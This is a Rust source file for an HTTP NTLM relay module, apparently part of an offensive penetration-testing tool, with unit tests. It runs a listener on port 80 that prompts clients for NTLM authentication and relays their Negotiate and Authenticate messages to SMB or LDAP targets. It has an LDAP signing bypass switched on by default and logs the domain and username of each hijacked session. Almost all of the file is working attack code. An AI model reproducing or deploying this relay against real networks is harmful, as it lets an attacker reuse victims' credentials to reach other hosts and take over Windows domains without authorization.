use crate::relay::{NtlmRelay, RelayConfig};
use crate::{RelayError, RelayTarget, Result};
use base64::Engine;
use std::collections::HashMap;
use std::io::{Read, Write};
use std::net::{TcpListener, TcpStream};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex as StdMutex};
use std::thread;
use std::time::Duration;
use tokio::runtime::Handle as TokioHandle;
use tokio::sync::Mutex as TokioMutex;
use tracing::{debug, info, warn};

const IO_TIMEOUT: Duration = Duration::from_secs(15);
const BUF: usize = 16_384;

#[derive(Debug, Clone)]
pub struct HttpRelayConfig {
    pub listen_ip: String,
    pub listen_port: u16,
    pub targets: Vec<RelayTarget>,
    pub socks5_proxy: Option<String>,
    pub ldap_signing_bypass: bool,
    pub max_retries: u32,
    pub timeout_secs: u64,
}

impl Default for HttpRelayConfig {
    fn default() -> Self {
        Self {
            listen_ip: "0.0.0.0".to_string(),
            listen_port: 80,
            targets: Vec::new(),
            socks5_proxy: None,
            ldap_signing_bypass: true,
            max_retries: 3,
            timeout_secs: 30,
        }
    }
}

#[derive(Clone)]
struct RelayBridge {
    relay: Arc<TokioMutex<NtlmRelay>>,
    handle: TokioHandle,
}

type PendingRelays = Arc<StdMutex<HashMap<String, (u64, Vec<u8>)>>>;

pub struct HttpRelay {
    config: HttpRelayConfig,
    running: Arc<AtomicBool>,
    threads: Vec<thread::JoinHandle<()>>,
}

impl HttpRelay {
    pub fn new(config: HttpRelayConfig) -> Self {
        Self {
            config,
            running: Arc::new(AtomicBool::new(false)),
            threads: Vec::new(),
        }
    }

    pub async fn start(&mut self) -> Result<()> {
        if self.running.load(Ordering::SeqCst) {
            return Err(RelayError::Config("HTTP relay already running".into()).into());
        }

        if self.config.targets.is_empty() {
            return Err(
                RelayError::Config("No relay targets configured for HTTP relay".into()).into(),
            );
        }

        let relay_config = RelayConfig {
            listen_ip: self.config.listen_ip.clone(),
            targets: self.config.targets.clone(),
            round_robin: true,
            remove_on_success: false,
            timeout_secs: self.config.timeout_secs,
            ldap_signing_bypass: self.config.ldap_signing_bypass,
            max_retries: self.config.max_retries,
            max_connections: 64,
            tls_client_identity: None,
            socks5_proxy: self.config.socks5_proxy.clone(),
        };
        let relay = Arc::new(TokioMutex::new(NtlmRelay::new(relay_config)));

        let listen_addr = format_addr(&self.config.listen_ip, self.config.listen_port);

        let target_summary: Vec<String> = self
            .config
            .targets
            .iter()
            .map(|t| format!("{}://{}", t.protocol, t.address))
            .collect();

        info!("HTTP asymmetric relay listening on {}", listen_addr);
        info!("Relay targets: {}", target_summary.join(", "));

        self.running.store(true, Ordering::SeqCst);

        let running = Arc::clone(&self.running);
        let bridge = RelayBridge {
            relay,
            handle: tokio::runtime::Handle::current(),
        };
        let pending: PendingRelays = Arc::new(StdMutex::new(HashMap::new()));

        let handle = thread::spawn(move || {
            let listener = match TcpListener::bind(&listen_addr) {
                Ok(l) => {
                    info!("HTTP relay thread bound to {}", listen_addr);
                    l
                }
                Err(e) => {
                    warn!("Failed to bind HTTP relay to {}: {}", listen_addr, e);
                    return;
                }
            };
            let _ = listener.set_nonblocking(true);

            while running.load(Ordering::SeqCst) {
                match listener.accept() {
                    Ok((stream, peer)) => {
                        debug!("HTTP relay: connection from {}", peer);
                        let r = bridge.clone();
                        let p = Arc::clone(&pending);
                        let ip = peer.ip().to_string();
                        thread::spawn(move || {
                            if let Err(e) = handle_client(stream, ip, r, p) {
                                debug!("HTTP relay client error: {}", e);
                            }
                        });
                    }
                    Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                        thread::sleep(Duration::from_millis(100));
                        continue;
                    }
                    Err(e) => {
                        warn!("HTTP relay accept error: {}", e);
                        thread::sleep(Duration::from_millis(100));
                    }
                }
            }
        });

        self.threads.push(handle);
        Ok(())
    }

    pub async fn stop(&mut self) -> Result<()> {
        self.running.store(false, Ordering::SeqCst);
        for handle in self.threads.drain(..) {
            let _ = handle.join();
        }
        info!("HTTP relay stopped");
        Ok(())
    }
}

fn handle_client(
    mut stream: TcpStream,
    client_ip: String,
    bridge: RelayBridge,
    pending_relays: PendingRelays,
) -> Result<()> {
    stream.set_read_timeout(Some(IO_TIMEOUT)).ok();
    stream.set_write_timeout(Some(IO_TIMEOUT)).ok();

    let mut buf = vec![0u8; BUF];

    let n = stream
        .read(&mut buf)
        .map_err(|e| RelayError::Network(format!("HTTP read error: {}", e)))?;
    let request = String::from_utf8_lossy(&buf[..n]);

    let auth_header = extract_ntlm_header(&request);

    let negotiate_b64 = if let Some(hdr) = auth_header {
        hdr.to_owned()
    } else {
        let resp = "HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: NTLM\r\nContent-Length: 0\r\nConnection: keep-alive\r\n\r\n";
        stream
            .write_all(resp.as_bytes())
            .map_err(|e| RelayError::Network(format!("HTTP write error: {}", e)))?;

        let n2 = stream
            .read(&mut buf)
            .map_err(|e| RelayError::Network(format!("HTTP read error: {}", e)))?;
        let req2 = String::from_utf8_lossy(&buf[..n2]);
        extract_ntlm_header(&req2)
            .ok_or_else(|| RelayError::Protocol("Client did not send NTLM Negotiate".into()))?
            .to_owned()
    };

    let negotiate_bytes = base64_decode(&negotiate_b64)?;

    let (relay_id, challenge_bytes) = bridge.handle.block_on(async {
        let mut guard = bridge.relay.lock().await;
        guard.relay_negotiate(&negotiate_bytes).await
    })?;

    pending_relays
        .lock()
        .map_err(|e| RelayError::Config(format!("Mutex poisoned: {}", e)))?
        .insert(client_ip.clone(), (relay_id, challenge_bytes.clone()));

    let challenge_b64 = base64_encode(&challenge_bytes);
    let chall_resp = format!(
        "HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: NTLM {}\r\nContent-Length: 0\r\nConnection: keep-alive\r\n\r\n",
        challenge_b64
    );
    stream
        .write_all(chall_resp.as_bytes())
        .map_err(|e| RelayError::Network(format!("HTTP write error: {}", e)))?;

    let n3 = stream
        .read(&mut buf)
        .map_err(|e| RelayError::Network(format!("HTTP read error: {}", e)))?;
    let req3 = String::from_utf8_lossy(&buf[..n3]);
    let auth_b64 = req3
        .lines()
        .find(|l| l.to_lowercase().starts_with("authorization: ntlm "))
        .ok_or_else(|| RelayError::Protocol("Client did not send NTLM Authenticate".into()))?;

    let authenticate_bytes = base64_decode(strip_ntlm_prefix(auth_b64))?;

    let (relay_id, _) = pending_relays
        .lock()
        .map_err(|e| RelayError::Config(format!("Mutex poisoned: {}", e)))?
        .remove(&client_ip)
        .ok_or_else(|| RelayError::Protocol("No pending relay state for client".into()))?;

    let session = bridge.handle.block_on(async {
        let mut guard = bridge.relay.lock().await;
        guard
            .relay_authenticate(relay_id, &authenticate_bytes)
            .await
    });

    match session {
        Ok(session) => {
            info!(
                "HTTP relay succeeded: {}\\{} -> {}://{}",
                session.domain, session.username, session.target.protocol, session.target.address
            );
            let resp = "HTTP/1.1 200 OK\r\nContent-Length: 0\r\nConnection: close\r\n\r\n";
            let _ = stream.write_all(resp.as_bytes());
            Ok(())
        }
        Err(e) => {
            warn!(
                "HTTP relay failed for {} (id={}): {}",
                client_ip, relay_id, e
            );
            let resp =
                "HTTP/1.1 401 Unauthorized\r\nContent-Length: 0\r\nConnection: close\r\n\r\n";
            let _ = stream.write_all(resp.as_bytes());
            Err(e)
        }
    }
}

fn extract_ntlm_header(request: &str) -> Option<&str> {
    request
        .lines()
        .find(|l| l.to_lowercase().starts_with("authorization: ntlm "))
}

fn strip_ntlm_prefix(header: &str) -> &str {
    let h = header.trim();
    for prefix in &[
        "Authorization: NTLM ",
        "authorization: ntlm ",
        "WWW-Authenticate: NTLM ",
        "www-authenticate: ntlm ",
    ] {
        if h.to_lowercase().starts_with(&prefix.to_lowercase()) {
            return &h[prefix.len()..];
        }
    }
    h
}

fn base64_encode(data: &[u8]) -> String {
    base64::engine::general_purpose::STANDARD.encode(data)
}

fn base64_decode(data: &str) -> Result<Vec<u8>> {
    base64::engine::general_purpose::STANDARD
        .decode(data.trim())
        .map_err(|e| RelayError::Protocol(format!("Base64 decode error: {}", e)).into())
}

fn format_addr(ip: &str, port: u16) -> String {
    match ip.parse::<std::net::IpAddr>() {
        Ok(std::net::IpAddr::V6(_)) => format!("[{}]:{}", ip, port),
        _ => format!("{}:{}", ip, port),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_format_addr_http() {
        assert_eq!(format_addr("0.0.0.0", 80), "0.0.0.0:80");
        assert_eq!(format_addr("::", 80), "[::]:80");
        assert_eq!(format_addr("127.0.0.1", 8080), "127.0.0.1:8080");
    }

    #[test]
    fn test_extract_ntlm_header_found() {
        let req = "GET / HTTP/1.1\r\nHost: test\r\nAuthorization: NTLM TlRMTVNTUAABAAAA\r\n\r\n";
        assert_eq!(
            extract_ntlm_header(req).map(|s| s.trim()),
            Some("Authorization: NTLM TlRMTVNTUAABAAAA")
        );
    }

    #[test]
    fn test_extract_ntlm_header_not_found() {
        let req = "GET / HTTP/1.1\r\nHost: test\r\n\r\n";
        assert_eq!(extract_ntlm_header(req), None);
    }

    #[test]
    fn test_strip_ntlm_prefix_auth() {
        let h = "Authorization: NTLM TlRMTVNTUAABAAAA";
        assert_eq!(strip_ntlm_prefix(h), "TlRMTVNTUAABAAAA");
    }

    #[test]
    fn test_strip_ntlm_prefix_www_auth() {
        let h = "WWW-Authenticate: NTLM TlRMTVNTUAAAAA";
        assert_eq!(strip_ntlm_prefix(h), "TlRMTVNTUAAAAA");
    }

    #[test]
    fn test_base64_roundtrip() {
        let data = b"NTLMSSP\x00\x01\x00\x00\x00";
        let encoded = base64_encode(data);
        let decoded = base64_decode(&encoded).unwrap();
        assert_eq!(decoded, data);
    }

    #[test]
    fn test_base64_decode_invalid() {
        assert!(base64_decode("not-valid-base64!!!").is_err());
    }

    #[test]
    fn test_http_relay_config_default() {
        let config = HttpRelayConfig::default();
        assert_eq!(config.listen_ip, "0.0.0.0");
        assert_eq!(config.listen_port, 80);
        assert!(config.targets.is_empty());
        assert!(config.socks5_proxy.is_none());
        assert!(config.ldap_signing_bypass);
    }

    #[test]
    fn test_http_relay_config_custom() {
        let target = RelayTarget {
            address: "192.168.1.100:445".parse().unwrap(),
            protocol: crate::Protocol::Smb,
            username: None,
        };
        let config = HttpRelayConfig {
            listen_ip: "10.0.0.1".to_string(),
            listen_port: 8080,
            targets: vec![target],
            socks5_proxy: Some("127.0.0.1:1080".to_string()),
            ldap_signing_bypass: false,
            max_retries: 5,
            timeout_secs: 60,
        };
        assert_eq!(config.listen_ip, "10.0.0.1");
        assert_eq!(config.listen_port, 8080);
        assert_eq!(config.targets.len(), 1);
        assert_eq!(config.targets[0].protocol, crate::Protocol::Smb);
        assert_eq!(config.socks5_proxy, Some("127.0.0.1:1080".to_string()));
        assert!(!config.ldap_signing_bypass);
        assert_eq!(config.max_retries, 5);
        assert_eq!(config.timeout_secs, 60);
    }
}
